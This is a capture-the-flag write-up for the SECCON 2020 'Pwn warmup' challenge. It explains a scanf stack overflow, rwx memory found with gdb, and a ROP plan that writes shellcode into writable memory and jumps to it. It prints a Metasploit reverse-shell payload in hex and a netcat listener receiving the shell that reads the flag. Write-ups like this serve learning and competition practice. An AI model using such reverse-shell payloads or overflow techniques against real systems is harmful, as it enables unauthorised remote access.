# SECCON CTF 2020 - Pwn warmup

I solved this pwn challenge during SECCON 2020 CTF competition. Challenge contained a binary with the following C code:

```c
#include <unistd.h>
#include <stdio.h>

int main(void) {
  char buf[0x20];
  puts("Welcome to Pwn Warmup!");
  scanf("%s", buf);
  fclose(stdout);
  fclose(stderr);
}

__attribute__((constructor))
void setup(void) {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);
  alarm(60);
}
```

## Problem

The challenge is pretty straightforward as there is usage of the `scanf` function - we will get to that in a second. Since this is a warmup task, this most probably means that NX is not enabled, or more specifically - there might be sections in memory that we can write and execute at the same time.

I have verified this with checksec and checked which memory region we can write and execute with gdb:

```
gdb-peda$ vmmap
Start              End                Perm	Name
0x00400000         0x00401000         r-xp	/home/l/Downloads/pwarmup/chall
0x00600000         0x00601000         rwxp	/home/l/Downloads/pwarmup/chall
0x00007ffff7e02000 0x00007ffff7fb8000 r-xp	/usr/lib/x86_64-linux-gnu/libc-2.28.so
0x00007ffff7fb8000 0x00007ffff7fb9000 ---p	/usr/lib/x86_64-linux-gnu/libc-2.28.so
0x00007ffff7fb9000 0x00007ffff7fbd000 r-xp	/usr/lib/x86_64-linux-gnu/libc-2.28.so
0x00007ffff7fbd000 0x00007ffff7fbf000 rwxp	/usr/lib/x86_64-linux-gnu/libc-2.28.so
0x00007ffff7fbf000 0x00007ffff7fc5000 rwxp	mapped
0x00007ffff7fd0000 0x00007ffff7fd3000 r--p	[vvar]
0x00007ffff7fd3000 0x00007ffff7fd5000 r-xp	[vdso]
0x00007ffff7fd5000 0x00007ffff7ffc000 r-xp	/usr/lib/x86_64-linux-gnu/ld-2.28.so
0x00007ffff7ffc000 0x00007ffff7ffd000 r-xp	/usr/lib/x86_64-linux-gnu/ld-2.28.so
0x00007ffff7ffd000 0x00007ffff7ffe000 rwxp	/usr/lib/x86_64-linux-gnu/ld-2.28.so
0x00007ffff7ffe000 0x00007ffff7fff000 rwxp	mapped
0x00007ffffffde000 0x00007ffffffff000 rwxp	[stack]
```

I kind of expected this. There are W^X sections available to us, in particular we can write and execute memory from `0x00600000` to `0x00601000`. Now back to the `scanf` function.

The way that `scanf` works is it writes user input to memory specified as the second parameter. From the code:

```
scanf("%s", buf);
```

`scanf` writes a char array (bytes) into the `buf` variable which is memory that `buf` points to with no limits, meaning buffer overflow. First thing that would come to mind here is that we can overflow the buffer, overwrite instruction pointer with `jmp esp` or `jmp rsp` and then continue with our shellcode, but this is not the case here.

If we think for a second how the `scanf` function works, we can utilize the `scanf` function to write shellcode to a memory region that we specify after we have control of the instruction pointer.

## ROP chain

So, the solution to the problem is basically straightforward:
- overflow the buffer
- craft a gadget that will call `scanf("%s", 0x00600000)`
- `scanf` executes, so input your shellcode to it
- redirect execution to `0x00600000`

I managed to craft this fairly quickly but had issues with shellcode that executes `/bin/sh` as I could never attach to the shell but I saw it executing.

After few tries, I decided to just use the reverse shell shellcode from metasploit:

```
$ msfvenom -p linux/x64/shell_reverse_tcp -f hex LHOST=127.0.0.1 LPORT=4444
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of hex file: 148 bytes
6a2958996a025f6a015e0f05489748b90200115c7f000001514889e66a105a6a2a580f056a035e48ffce6a21580f0575f66a3b589948bb2f62696e2f736800534889e752574889e60f05
```

After running the solution script, I have obtained the shell:

```
$ nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on ...
ls
chall
flag-e6951df0400add6a6b5be11f25b80cea.txt
redir.sh
cat flag*
SECCON{1t's_g3tt1ng_c0ld_1n_j4p4n_d0n't_f0rget_t0_w4rm-up}
```
